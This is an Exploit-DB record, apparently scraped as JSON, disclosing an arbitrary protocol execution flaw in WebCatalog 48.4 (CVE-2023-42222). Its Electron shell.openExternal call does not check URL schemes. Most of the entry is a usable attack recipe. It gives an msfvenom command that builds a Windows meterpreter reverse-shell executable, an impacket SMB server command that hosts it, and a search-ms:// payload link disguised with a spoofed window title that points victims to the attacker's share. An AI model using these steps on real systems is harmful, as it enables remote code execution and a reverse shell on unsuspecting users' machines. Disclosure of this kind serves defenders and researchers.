{"source": "https://www.exploit-db.com/exploits/51765", "vulnName": "WebCatalog 48.4 - Arbitrary Protocol Execution", "vulnEDBID": "51765", "vulnCVE": "N/A", "author": "ITSSIXTYN3IN", "exploitType": "REMOTE", "platform": "WINDOWS", "datePublished": "2024-02-02", "vulnContent": "# Exploit Title: WebCatalog 48.4 - Arbitrary Protocol Execution\n# Date: 9/27/2023\n# Exploit Author: ItsSixtyN3in\n# Vendor Homepage: https://webcatalog.io/en/\n# Software Link: https://cdn-2.webcatalog.io/webcatalog/WebCatalog%20Setup%2052.3.0.exe\n# Version: 48.4.0\n# Tested on: Windows\n# CVE : CVE-2023-42222\n\nVulnerability summary:\nWebCatalog before version 48.8 calls the Electron shell.openExternal function without verifying that the URL is for an http or https resource. This vulnerability allows an attacker to potentially execute code through arbitrary protocols on the victims machine by having users sync pages with malicious URLs. The victim has to interact with the link, which can then enable an attacker to bypass security measures for malicious file delivery.\n\nExploit details:\n\n-   Create a reverse shell file.\n\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe\n\n\n\n-   Host a reverse shell file (or otherwise) on your own SMB share using impacket (https://github.com/fortra/impacket/blob/master/examples/smbserver.py)\n\npython3 smbserver.py Tools -smb2support\n\n\n\n-   Have the user sync a page with the payload as a renamed link\n\n[Friendly Link](Search-ms://query=<FileName>&crumb=location\\\\<attackerIP>\\<attackerSMBShare>&displayname=Spoofed%20Windows%20Title)\n\n\n\nPayload:\nsearch-ms://query=<FileName>&crumb=location\\\\<attackerIP>\\<attackerSMBShare>&displayname=Spoofed%20Windows%20Title\n\nTobias Diehl\nSecurity Consultant\nOSCP, CRTO, CEH, PenTest+, AZ-500, SC-200/300\nPronouns: he/him\ne-mail:  tobias.diehl@bulletproofsi.com\n            "}